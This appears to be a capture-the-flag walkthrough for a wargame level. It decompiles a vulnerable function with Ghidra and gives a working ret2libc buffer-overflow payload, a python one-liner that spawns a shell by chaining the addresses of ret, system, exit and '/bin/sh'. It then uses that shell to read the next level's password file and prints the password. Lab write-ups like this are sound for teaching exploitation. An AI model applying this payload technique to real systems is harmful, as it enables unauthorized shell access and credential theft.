get the binary on host
* `scp -P 4242 level2@192.168.56.107:./level2 ./binary/level2`

decompile using ghidra

we can use a buffer overflow to run a sh, but we can't pass hexa starting at \xbZ (no Z is valide)
```
	void p(void)
	{
		uint unaff_retaddr;
		undefined local_50 [76];
		
		fflush(stdout);
		gets(local_50)
		if ((unaff_retaddr & 0xb0000000) == 0xb0000000) {
			printf("(%p)\n",unaff_retaddr);
							/* WARNING: Subroutine does not return */
			_exit(1);
		}
		puts(local_50);
		strdup(local_50);
		return;
	}
```
To bypass the check, we will add the address of return of function before our payload
* `/bin/sh`	=> 0xb7 f8 cc 58
* `system`	=> 0xb7 e6 b0 60
* `exit`    =>  0xb7 e5 eb e0
* `p ret`   => 0x08 04 85 3e

Using our 80 char array + thoose address we can lauch a new shell.\
This array is `80 char` + `p ret` + `addr system` + `addr exit` + `addr "/bin/sh"`\
`python -c 'print "a"* 80 + "\x3e\x85\x04\x08" + "\x60\xb0\xe6\xb7" + "\xe0\xeb\xe5\xb7" + "\x58\xcc\xf8\xb7"' > /tmp/exploit_2; cat /tmp/exploit_2 - | ./level2`\
We can input our cat
* `cat /home/user/level3/.pass`
* and get the pass `492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02`